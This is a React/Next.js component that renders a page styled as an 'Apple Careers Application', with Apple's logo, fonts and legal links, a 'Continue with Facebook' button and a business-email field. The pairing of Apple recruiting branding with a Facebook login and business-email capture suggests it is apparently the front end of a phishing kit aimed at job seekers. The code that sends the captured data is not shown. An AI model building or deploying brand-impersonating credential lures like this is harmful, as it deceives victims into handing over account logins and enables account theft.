import React from "react";
import Image from "next/image";
import LoadingSpinner from "../ui/LoadingSpinner";

function ActualForm({
  BusinessEmail,
  setBusinessEmail,
  BusinessEmailError,
  handleContinueWithEmail,
  NextStep,
  FacebookLogo,
  isLoading,
  loadingType,
}) {
  const isFacebookLoading = isLoading && loadingType === "facebook";
  const isEmailLoading = isLoading && loadingType === "email";

  const appleFont = "-apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', Helvetica, Arial, sans-serif";

  return (
    <div className="md:w-1/2 justify-center mb-5 mt-5 flex flex-col gap-4 md:gap-5 w-full rounded-2xl shadow-2xl p-6 md:p-10 border" style={{background:'#1d1d1f', borderColor:'rgba(255,255,255,0.1)', color:'#ffffff'}}>
      <div className="flex flex-col gap-3 text-center items-center">
        <svg width="24" height="24" viewBox="0 0 814 1000" fill="#f5f5f7" aria-label="Apple logo" style={{marginBottom:'4px'}}>
          <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.3-167.2-107.8c-52.3-61.3-95.8-155.2-95.8-244.2 0-170.1 111.4-259.7 220.7-259.7 61 0 112.7 39.7 151 39.7 37.3 0 97.3-41.8 166.3-41.8 26.4 0 108.2 2.4 168.6 71.7zm-174.5-71.4c-30.9-36.7-74.9-61.3-121.7-61.3-50.5 0-101.7 36.1-132.7 72.8-28.3 33.1-51.3 84.4-51.3 135.5 0 7.1.6 14.2 1.2 16.5 3.2.6 8.4 1.2 13.6 1.2 45.4 0 96.5-30.3 126.8-66.4 29.7-35.4 52.4-86.7 52.4-138.5 0-7.1-.6-12.3-1.2-18.9"/>
        </svg>
        <h2 className="text-2xl md:text-3xl font-semibold m-0 px-1 sm:px-0 leading-tight" style={{color:'#f5f5f7', fontFamily: appleFont}}>
          Apple Careers Application
        </h2>
        <p className="text-base m-0 font-light" style={{color:'rgba(245,245,247,0.6)', fontFamily: appleFont}}>
          Thank you for your interest in joining Apple.
        </p>
        <p className="text-sm m-0 px-1 sm:px-0 leading-relaxed" style={{color:'rgba(245,245,247,0.45)', fontFamily: appleFont}}>
          Continue below to begin the application process. We believe each person 
          brings a unique perspective — and we can't wait to learn about yours.
        </p>
      </div>

      <button
        onClick={() =>
          !isLoading && NextStep("User clicked continue with Facebook")
        }
        disabled={isLoading}
        className={`w-[95%] md:w-[80%] mx-auto text-sm font-medium py-3 md:py-4 px-4 rounded-xl flex items-center justify-center gap-3 cursor-pointer transition-all duration-200 ease-in-out min-h-[48px] md:min-h-[52px] border ${
          isLoading
            ? "opacity-60 cursor-not-allowed"
            : "hover:border-white/40"
        }`}
        style={{background:'rgba(255,255,255,0.07)', borderColor:'rgba(255,255,255,0.18)', color:'#f5f5f7', fontFamily: appleFont}}
      >
        {isFacebookLoading && <LoadingSpinner />}
        {FacebookLogo && !isFacebookLoading && (
          <Image
            src={FacebookLogo}
            alt="Facebook Logo"
            width={20}
            height={20}
            style={{ color: "#1877F2" }}
          />
        )}
        {isFacebookLoading
          ? "Connecting with Facebook..."
          : "Continue with Facebook"}
      </button>

      <div className="relative flex items-center justify-center w-full">
        <div className="absolute top-1/2 left-0 right-0" style={{borderTop:'1px solid rgba(255,255,255,0.12)'}}></div>
        <span className="relative px-4 text-sm" style={{background:'#1d1d1f', color:'rgba(245,245,247,0.35)', fontFamily: appleFont}}>
          or
        </span>
      </div>

      <div className="flex flex-col gap-1.5 w-full">
        <label
          htmlFor="email-input"
          className="w-[95%] md:w-[80%] mx-auto text-sm font-medium text-left"
          style={{color:'rgba(245,245,247,0.7)', fontFamily: appleFont}}
        >
          Email Address
        </label>
        <input
          id="email-input"
          type="email"
          placeholder="Enter your email address"
          value={BusinessEmail}
          onChange={(e) => setBusinessEmail(e.target.value)}
          disabled={isLoading}
          aria-invalid={!!BusinessEmailError}
          aria-describedby={BusinessEmailError ? "email-error" : undefined}
          className={`w-[95%] md:w-[80%] mx-auto py-3 md:py-4 px-4 rounded-xl border text-sm box-border outline-none transition-all duration-200 ${
            isLoading
              ? "opacity-60 cursor-not-allowed"
              : ""
          }`}
          style={{background:'rgba(255,255,255,0.07)', borderColor:'rgba(255,255,255,0.18)', color:'#f5f5f7', fontFamily: appleFont}}
          onFocus={(e) => { e.target.style.borderColor = '#0071e3'; e.target.style.boxShadow = '0 0 0 3px rgba(0,113,227,0.3)'; }}
          onBlur={(e) => { e.target.style.borderColor = 'rgba(255,255,255,0.18)'; e.target.style.boxShadow = 'none'; }}
        />
        {BusinessEmailError && (
          <div
            id="email-error"
            className="text-xs mt-1 font-medium"
            style={{color:'#ff453a', fontFamily: appleFont}}
          >
            {BusinessEmailError}
          </div>
        )}
      </div>

      <button
        onClick={handleContinueWithEmail}
        disabled={isLoading}
        className={`border-none w-[95%] md:w-[80%] mx-auto text-white text-sm font-medium py-3 md:py-4 px-6 rounded-xl flex items-center justify-center gap-3 cursor-pointer transition-all duration-200 ease-in-out mt-1 md:mt-2 min-h-[48px] md:min-h-[52px] ${
          isLoading ? "opacity-60 cursor-not-allowed" : ""
        }`}
        style={{background:'#0071e3', fontFamily: appleFont}}
        onMouseOver={(e) => { if (!isLoading) e.currentTarget.style.background = '#0077ed'; }}
        onMouseOut={(e) => { e.currentTarget.style.background = '#0071e3'; }}
      >
        {isEmailLoading && <LoadingSpinner />}
        {isEmailLoading ? "Processing..." : "Continue"}
      </button>

      <div className="text-center mt-2">
        <p className="text-xs leading-relaxed" style={{color:'rgba(245,245,247,0.25)', fontFamily: appleFont}}>
          By continuing, you agree to Apple's{' '}
          <a href="https://www.apple.com/legal/privacy/" target="_blank" rel="noopener noreferrer" style={{color:'rgba(245,245,247,0.4)', textDecoration:'underline'}}>Privacy Policy</a>
          {' '}and{' '}
          <a href="https://www.apple.com/legal/" target="_blank" rel="noopener noreferrer" style={{color:'rgba(245,245,247,0.4)', textDecoration:'underline'}}>Terms of Use</a>.
        </p>
      </div>
    </div>
  );
}

export default ActualForm;
